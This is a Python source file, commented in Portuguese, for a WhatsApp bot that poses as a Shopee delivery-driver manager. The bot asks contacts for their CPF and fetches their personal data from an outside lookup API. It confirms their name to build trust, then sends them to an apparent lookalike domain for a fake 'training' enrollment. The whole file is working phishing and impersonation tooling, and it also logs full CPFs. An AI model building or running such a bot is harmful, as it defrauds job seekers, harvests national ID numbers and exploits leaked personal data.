#!/usr/bin/env python3
"""
Sistema de Automação de Conversas
Gerencia fluxos automáticos de resposta baseado no contexto da conversa
"""
import logging
import re
import requests
import json
from typing import Dict, Any, Optional, Tuple
from datetime import datetime, timedelta

class ConversationAutomation:
    """Automação inteligente de conversas WhatsApp"""
    
    def __init__(self, whatsapp_api, db, phone_number_id=None):
        self.whatsapp_api = whatsapp_api
        self.db = db
        self.phone_number_id = phone_number_id
        
        # Configurar phone_number_id na API se fornecido
        if phone_number_id:
            self.whatsapp_api.set_phone_number_id(phone_number_id)
        
    def should_trigger_automation(self, phone_number: str, conversation_id: int) -> bool:
        """Verifica se deve disparar automação para esta conversa"""
        try:
            from models import ChatMessage, ConversationState
            
            # Verificar estado persistente
            normalized_phone = self._normalize_phone(phone_number)
            conv_state = ConversationState.query.filter_by(phone_number=normalized_phone).first()
            
            # Se já tem estado, sempre processar
            if conv_state:
                return True
            
            # Senão, verificar se é primeira mensagem
            client_messages = ChatMessage.query.filter_by(
                conversation_id=conversation_id,
                direction='inbound'
            ).count()
            
            if client_messages == 1:
                logging.info(f"🤖 PRIMEIRA MENSAGEM detectada de {phone_number} - INICIANDO AUTOMAÇÃO")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Erro ao verificar automação: {str(e)}")
            return False
    
    def process_automation(self, phone_number: str, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processa automação baseada no estado da conversa"""
        try:
            from models import ConversationState
            
            # Normalizar número e buscar estado persistente
            normalized_phone = self._normalize_phone(phone_number)
            conv_state = ConversationState.get_or_create(normalized_phone)
            current_state = conv_state.current_state
            
            logging.info(f"🤖 Processando automação - Estado: {current_state} - Mensagem: {message_content[:50]}")
            
            if current_state == 'initial':
                return self._handle_initial_contact(conv_state, conversation_id, phone_number_id)
            elif current_state == 'waiting_cpf':
                return self._handle_cpf_input(conv_state, conversation_id, message_content, phone_number_id)
            elif current_state == 'confirming_name':
                return self._handle_name_confirmation(conv_state, conversation_id, message_content, phone_number_id)
            
            return False
            
        except Exception as e:
            logging.error(f"Erro na automação: {str(e)}")
            return False
    
    def _handle_initial_contact(self, conv_state, conversation_id: int, phone_number_id: str) -> bool:
        """Resposta inicial - apresentar como gerente da Shopee"""
        try:
            message = (
                "Olá! Sou a gerente de entregadores da Shopee.\n\n"
                "Estou aqui para ajudar você a finalizar seu cadastro de Entregador da Shopee.\n\n"
                "Para prosseguir, preciso validar seus dados.\n"
                "Por favor, digite seu CPF (apenas números, sem pontos ou traços):"
            )
            
            # Enviar mensagem
            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, message)
            
            if success:
                # Atualizar estado persistente
                conv_state.update_state('waiting_cpf')
                
                # Salvar mensagem enviada no banco
                self._save_outbound_message(conversation_id, message, result.get('messageId'))
                
                logging.info(f"✅ Mensagem inicial enviada para {conv_state.phone_number}")
                return True
            else:
                logging.error(f"❌ Falha ao enviar mensagem inicial: {result}")
                return False
                
        except Exception as e:
            logging.error(f"Erro na resposta inicial: {str(e)}")
            return False
    
    def _handle_cpf_input(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar CPF digitado pelo usuário"""
        try:
            # Extrair CPF da mensagem
            cpf = self._extract_cpf(message_content)
            
            if not cpf:
                # CPF inválido - pedir novamente
                error_message = (
                    "❌ CPF inválido ou não reconhecido.\n\n"
                    "📄 Por favor, digite apenas os números do seu CPF (11 dígitos):\n"
                    "Exemplo: 12345678901\n\n"
                    "⚠️ Certifique-se de que o CPF está correto (com dígitos verificadores válidos)"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, error_message)
                if success:
                    self._save_outbound_message(conversation_id, error_message, result.get('messageId'))
                
                return True
            
            # CPF válido - enviar mensagem de aguarde
            cpf_masked = f"***.***.*{cpf[8:9]}*-**"  # Mascarar quase todo o CPF nos logs
            logging.info(f"🔍 Buscando dados para CPF {cpf_masked}")
            
            wait_message = (
                "⏳ Aguarde um momento...\n"
                "🔍 Estou buscando seu cadastro no sistema Shopee..."
            )
            
            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, wait_message)
            if success:
                self._save_outbound_message(conversation_id, wait_message, result.get('messageId'))
            
            # Buscar dados na API
            client_data = self._fetch_client_data(cpf)
            
            if client_data and client_data.get('sucesso'):
                # Cliente encontrado - confirmar nome
                cliente = client_data.get('cliente', {})
                nome = cliente.get('nome', 'Nome não informado')
                
                # Salvar dados do cliente no estado persistente
                import json
                conv_state.update_state('confirming_name', json.dumps(client_data))
                
                # Criar mensagem de confirmação com botões
                return self._send_name_confirmation(conv_state, conversation_id, nome, phone_number_id)
            else:
                # Cliente não encontrado
                not_found_message = (
                    "❌ CPF não encontrado no sistema Shopee.\n\n"
                    "🤔 Verifique se:\n"
                    "• O CPF está correto e válido\n"
                    "• Você já fez algum pedido na Shopee\n\n"
                    "📄 Tente novamente ou digite seu CPF correto:"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, not_found_message)
                if success:
                    self._save_outbound_message(conversation_id, not_found_message, result.get('messageId'))
                
                return True
                
        except Exception as e:
            logging.error(f"Erro ao processar CPF: {str(e)}")
            return False
    
    def _send_name_confirmation(self, conv_state, conversation_id: int, nome: str, phone_number_id: str) -> bool:
        """Enviar confirmação de nome com botões interativos do WhatsApp"""
        try:
            # Mensagem de confirmação
            confirmation_message = (
                f"✅ Cadastro encontrado!\n\n"
                f"👤 Nome: **{nome}**\n\n"
                f"🤔 Este é o seu nome correto?"
            )
            
            # Tentar enviar com botões interativos do WhatsApp
            buttons = [
                {
                    'type': 'reply',
                    'reply': {
                        'id': 'confirm_name_yes',
                        'title': '✅ SIM'
                    }
                },
                {
                    'type': 'reply', 
                    'reply': {
                        'id': 'confirm_name_no',
                        'title': '❌ NÃO'
                    }
                }
            ]
            
            # Enviar mensagem com botões interativos
            success, result = self._send_interactive_buttons(conv_state.phone_number, confirmation_message, buttons)
            
            if success:
                self._save_outbound_message(conversation_id, confirmation_message + " [Com botões interativos]", result.get('messageId'))
                logging.info(f"✅ Confirmação de nome com botões enviada para {conv_state.phone_number}: {nome[:20]}...")
                return True
            else:
                # Fallback para mensagem de texto simples
                logging.warning("Botões interativos falharam, usando fallback de texto")
                buttons_message = (
                    confirmation_message + "\n\n"
                    "👆 Confirme se o nome acima está correto:\n\n"
                    "1️⃣ Digite **SIM** se está correto\n"
                    "2️⃣ Digite **NAO** se está incorreto"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, buttons_message)
                if success:
                    self._save_outbound_message(conversation_id, buttons_message, result.get('messageId'))
                    return True
            
            return False
            
        except Exception as e:
            logging.error(f"Erro ao enviar confirmação: {str(e)}")
            return False
    
    def _send_interactive_buttons(self, phone_number: str, message: str, buttons: list) -> Tuple[bool, Dict]:
        """Enviar mensagem com botões interativos do WhatsApp"""
        try:
            # Montar payload para botões interativos
            payload = {
                'messaging_product': 'whatsapp',
                'to': phone_number,
                'type': 'interactive',
                'interactive': {
                    'type': 'button',
                    'body': {
                        'text': message
                    },
                    'action': {
                        'buttons': buttons
                    }
                }
            }
            
            # Usar API do WhatsApp para enviar
            url = f"{self.whatsapp_api.base_url}/{self.whatsapp_api.phone_number_id}/messages"
            
            # Enviar via pipeline de proxy
            response = self.whatsapp_api._send_via_proxy_only(url, payload)
            
            if response.status_code == 200:
                data = response.json()
                return True, {
                    'messageId': data.get('messages', [{}])[0].get('id', ''),
                    'status': 'sent'
                }
            else:
                logging.error(f"Erro ao enviar botões interativos: {response.status_code} - {response.text}")
                return False, {'error': f'HTTP {response.status_code}'}
                
        except Exception as e:
            logging.error(f"Erro na função de botões interativos: {str(e)}")
            return False, {'error': str(e)}
    
    def _handle_name_confirmation(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar resposta de confirmação de nome"""
        try:
            content_lower = message_content.lower().strip()
            
            # Detectar resposta (texto ou botão interativo)
            if content_lower in ['sim', 'yes', 's', '1', 'confirm_name_yes', '✅ sim']:
                # Nome confirmado - extrair primeiro nome dos dados salvos
                import json
                client_data = json.loads(conv_state.state_data) if conv_state.state_data else {}
                full_name = client_data.get('nome', 'Usuário')
                first_name = full_name.split()[0] if full_name else 'Usuário'
                
                success_message = (
                    f"Perfeito {first_name}! Nome confirmado.\n\n"
                    "Para finalizar o cadastro e começar a realizar as entregas está faltando apenas iniciar o treinamento de entregadores da Shopee.\n\n"
                    "Clique no botão abaixo para se matricular no treinamento:"
                )
                
                # Enviar mensagem com botão CTA
                success, result = self.whatsapp_api.send_interactive_cta_url_message(
                    conv_state.phone_number, 
                    success_message,
                    "Finalizar Cadastro",
                    "https://shopee.acesso.inc/treinamento"
                )
                
                if success:
                    self._save_outbound_message(conversation_id, success_message + "\n[Botão: Finalizar Cadastro]", result.get('messageId'))
                    # Limpar estado da automação
                    conv_state.clear_state()
                    logging.info(f"✅ Automação concluída com sucesso para {conv_state.phone_number}")
                    return True
                else:
                    logging.error(f"❌ Falha ao enviar mensagem final: {result}")
                    return False
                
            elif content_lower in ['nao', 'não', 'no', 'n', '2', 'confirm_name_no', '❌ nao']:
                # Nome não confirmado
                error_message = (
                    "Nome não confirmado.\n\n"
                    "Vamos tentar novamente.\n"
                    "Digite seu CPF correto (apenas números):"
                )
                
                # Voltar ao estado de espera de CPF
                conv_state.update_state('waiting_cpf')
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, error_message)
                if success:
                    self._save_outbound_message(conversation_id, error_message, result.get('messageId'))
                
                return True
            else:
                # Resposta não reconhecida
                help_message = (
                    "Não entendi sua resposta.\n\n"
                    "Por favor, escolha uma opção:\n"
                    "Digite SIM se o nome está correto\n"
                    "Digite NAO se o nome está incorreto"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, help_message)
                if success:
                    self._save_outbound_message(conversation_id, help_message, result.get('messageId'))
                
                return True
                
        except Exception as e:
            logging.error(f"Erro na confirmação de nome: {str(e)}")
            return False
    
    def _extract_cpf(self, message: str) -> Optional[str]:
        """Extrair e validar CPF da mensagem (com checksum mod 11)"""
        try:
            # Remover tudo que não é número
            numbers_only = re.sub(r'\D', '', message)
            
            # Verificar se tem 11 dígitos
            if len(numbers_only) != 11:
                return None
            
            # Validar checksum mod 11
            if self._validate_cpf_checksum(numbers_only):
                return numbers_only
            
            return None
            
        except Exception as e:
            logging.error(f"Erro ao extrair CPF: {str(e)}")
            return None
    
    def _validate_cpf_checksum(self, cpf: str) -> bool:
        """Validar checksum do CPF usando mod 11"""
        try:
            # CPFs inválidos conhecidos
            if cpf in ['00000000000', '11111111111', '22222222222', '33333333333', 
                      '44444444444', '55555555555', '66666666666', '77777777777',
                      '88888888888', '99999999999']:
                return False
            
            # Calcular primeiro dígito verificador
            soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
            resto = soma % 11
            digito1 = 0 if resto < 2 else 11 - resto
            
            # Calcular segundo dígito verificador
            soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
            resto = soma % 11
            digito2 = 0 if resto < 2 else 11 - resto
            
            # Verificar se os dígitos conferem
            return cpf[9] == str(digito1) and cpf[10] == str(digito2)
            
        except Exception as e:
            logging.error(f"Erro na validação do CPF: {str(e)}")
            return False
    
    def _fetch_client_data(self, cpf: str) -> Optional[Dict]:
        """Buscar dados do cliente na API externa"""
        try:
            api_url = f"https://recoveryfy.replit.app/api/v1/cliente/cpf/{cpf}"
            
            logging.info(f"🔍 Buscando CPF {cpf} na API: {api_url}")
            
            response = requests.get(api_url, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                logging.info(f"✅ API response: {data}")
                return data
            else:
                logging.warning(f"❌ API retornou status {response.status_code}")
                return None
                
        except Exception as e:
            logging.error(f"Erro ao buscar dados na API: {str(e)}")
            return None
    
    def _save_outbound_message(self, conversation_id: int, content: str, whatsapp_message_id: str = None):
        """Salvar mensagem enviada no banco"""
        try:
            from app import app
            from models import ChatMessage
            
            # Usar contexto da aplicação para evitar conflitos de sessão
            with app.app_context():
                message = ChatMessage.create_outbound(
                    conversation_id=conversation_id,
                    content=content
                )
                
                if whatsapp_message_id:
                    message.update_status('sent', whatsapp_message_id)
            
        except Exception as e:
            logging.error(f"Erro ao salvar mensagem outbound: {str(e)}")
    
    def _normalize_phone(self, phone: str) -> str:
        """Normalizar número de telefone"""
        if not phone:
            return phone
        
        # Remove + e espaços
        phone = phone.replace('+', '').replace(' ', '').replace('-', '')
        
        # Garantir que tem 13 dígitos (55 + 11 dígitos)
        if len(phone) == 11 and not phone.startswith('55'):
            phone = '55' + phone
        
        return phone